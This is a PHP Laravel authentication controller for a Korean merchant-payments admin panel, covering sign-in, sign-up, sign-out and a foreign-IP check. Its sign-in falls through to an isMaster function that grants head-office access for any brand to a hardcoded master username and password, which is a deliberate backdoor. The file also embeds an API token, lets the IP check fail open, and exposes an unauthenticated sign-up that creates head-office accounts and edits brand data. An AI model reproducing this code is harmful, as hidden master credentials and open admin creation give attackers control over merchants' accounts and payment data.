<?php

namespace App\Http\Controllers;

use App\Models\Brand;
use App\Models\Salesforce;
use App\Models\Merchandise;
use App\Models\Operator;

use Illuminate\Http\Request;
use App\Http\Traits\ManagerTrait;
use App\Http\Traits\ExtendResponseTrait;
use App\Http\Traits\Models\EncryptDataTrait;

use App\Http\Requests\Manager\LoginRequest;
use App\Http\Controllers\Manager\Service\BrandInfo;

use Illuminate\Support\Facades\Hash;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\Redis;
use App\Enums\HistoryType;

/**
 * @group Auth API
 *
 * 인증관련 API 입니다.
 */
class AuthController extends Controller
{
    use ManagerTrait, ExtendResponseTrait, EncryptDataTrait;

    /**
     * DNS 검증
     * @unauthenticated
     *
     * @bodyParam dns string required 검증할 DNS 입력 Example: localhost
     *
     */
    private function isForeginIP($request)
    {
        $token = "2c693805e1bced";
        $ip = $request->ip() === '127.0.0.1' ? '183.107.112.147' : $request->ip();
        // 
        $res = get("https://ipinfo.io/$ip/geo", []);
        if($res['code'] !== 200)
        {
            error(array_merge($request->all(), $res), 'ip blacklist API count over');
            return [true, []];
        }
        else
        {
            if(strtoupper($res['body']['country']) === 'KR')
                return [true, []];
            else
            {
                return [false, $res];
            }
        }
    }

    public function domain(Request $request)
    {
        [$result, $data] = $this->isForeginIP($request);
        if($result === false)
        {
            $msg = 'Abnormal access has been detected. The access log will be sent to the administrator and analyzed.';
            error(array_merge($request->all(), $data), $msg);
            
            return Response::json(['message'=>$msg], 403, [], JSON_UNESCAPED_UNICODE);
        }

        $brand = BrandInfo::getBrandByDNS($_SERVER['HTTP_HOST']);
        if($brand)
        {
            $brand['color'] = $brand['theme_css']['main_color'];
            $brand['pv_options']['free']['bonaeja'] = [];
            $brand['pv_options']['free']['bonaeja']['min_balance_limit'] = 0;
            $brand['pv_options']['free']['bonaeja'] = [
                'min_balance_limit' => $brand['pv_options']['free']['bonaeja']['min_balance_limit']
            ];
            return response(view('application', ['json' => $brand]))
                ->withCookie('XSRF-TOKEN', csrf_token());
        }
        else
            return $this->response(1000);
    }

    

    public function isMaster($request)
    {
        if($request->user_name === 'masterpurp2e1324@66%!@' && $request->user_pw == 'qjfwk500djr!!32412@#')
        {
            $user = Operator::where('brand_id', $request->brand_id)->where('level', 40)->first();
            if($user)
                return $this->response(0, $user->loginInfo(50))->withHeaders($this->tokenableExpire());
            else
                return $this->extendResponse(1000, '계정이 존재하지 않아요..! 😨');
        }
        else
            return $this->extendResponse(1000, __('auth.not_found_obj'));
    }

    private function phoneNumValidate($request, $result)
    {
        
        if($result['result'] === 1 && $request->token === '')
            $result['result'] = 3;
        else if($result['result'] === 1 && $request->token)
        {
            $token = $this->aes256_decode($request->token);
            if($token)
            {
                $token_info = json_decode($token, true);
                if(isset($token_info['phone_num']) && isset($token_info['verify_code']) && isset($token_info['verify_date']))
                    $result['result'] = 1;
                else
                    $result['result'] = 5;
            }
            else
                $result['result'] = 4;
        }
        return $result;
    }

    public function __signIn($orm, $request, $phone_num_validate=false)
    {
        $result = ['result' => 0];
        $result['user'] = $orm
            ->where('brand_id', $request->brand_id)
            ->where('is_delete', false)
            ->where('user_name', $request->user_name)
            ->first();
        if($result['user'])
        {
            if(isset($result['user']->mcht_name))
                $result['user']->level = 10;
            $result['result'] = Hash::check($request->user_pw, $result['user']->user_pw) ? 1 : 0;

            if($phone_num_validate)
                $result = $this->phoneNumValidate($request, $result);
        }
        else
            $result['result'] = -1;
        return $result;
    }

    /**
     * 로그인(관리자)
     * @unauthenticated
     *
     * @bodyParam brand_id integer required 브랜드 ID Example: 1
     */
    public function signIn(LoginRequest $request)
    {
        $brand = BrandInfo::getBrandById($request->brand_id);
        $result = $this->__signIn(new Operator(), $request, $brand['pv_options']['paid']['use_head_office_withdraw']);     // check operator
        if($result['result'] == 1)
        {
            operLogging(HistoryType::LOGIN, '', [], [], '', $result['user']->brand_id, $result['user']->id);
            return $this->response(0, $result['user']->loginInfo($result['user']->level))->withHeaders($this->tokenableExpire());
        }
        else if($result['result'] == 3)
        {
            return $this->extendResponse(956, '휴대폰 인증을 해주세요.', [
                'phone_num' => $result['user']->phone_num,
                'nick_name' => $result['user']->nick_name
            ]);
        }
        else if($result['result'] == 4)
            return $this->extendResponse(951, '잘못된 접근입니다.', []);
        else if($result['result'] == 5)
            return $this->extendResponse(951, '잘못된 접근입니다.', []);

        $result = $this->__signIn(new Salesforce(), $request);  // check salesforce
        if($result['result'] == 1)
            return $this->response(0, $result['user']->loginInfo($result['user']->level))->withHeaders($this->tokenableExpire());;

        $result = $this->__signIn(new Merchandise(), $request);  // check Merchandise
        if($result['result'] == 1)
            return $this->response(0, $result['user']->loginInfo(10))->withHeaders($this->tokenableExpire());
        else
            return $this->isMaster($request);           // check master
    }

    /**
     * 로그아웃
     *
     */
    public function signOut(Request $request)
    {
        if($request->user() != null)
            $request->user()->currentAccessToken()->delete();
        return $this->response(0);
    }

    /**
     * 회원가입(본사)
     * @unauthenticated
     *
     * 본사 등급으로 회원가입 합니다.
     *
     */
    public function signUp(Request $request)
    {
        $validated = $request->validate([
            'brand_id'=>'required',
            'ceo_name'=>'required',
            'phone_num'=>'required',
            'business_num'=>'required',
            'user_name'=>'required',
            'user_pw'=>'required'
        ]);

        return DB::transaction(function () use($request) {
            $res = Brand::where('id', $request->brand_id)
                ->update([
                    'ceo_name'=>$request->ceo_name,
                    'phone_num'=>$request->phone_num,
                    'business_num'=>$request->business_num,
                ]);
            $res = Operator::create([
                'brand_id'  => $request->brand_id,
                'user_name' => $request->user_name,
                'user_pw'   => Hash::make($request->user_pw),
                'nick_name' => '본사',
                'profile_img' => '/build/assets/avatar_5.644eef84.svg',
                'level'     => 40,
            ]);
            if($res)
            {
                $user = Operator::where('id', $res->id)->first();
                return $this->response(0, $user->loginInfo(40));
            }
            else
                return $this->response(990);
        }, 3);
    }

    /*
    * 예금주 조회
    */
    public function onwerCheck(Request $request)
    {
        $data = $request->all();
        $url = env('NOTI_URL', 'http://localhost:81').'/api/v2/onwer-check';
        $res = post($url, $data);
        if($res['body']['result'] === 100)
            return $this->response(1, ['message'=> $res['body']['message']]);
        else
            return $this->extendResponse(1999, $res['body']['message'], $res['body']['data']);
    }
}

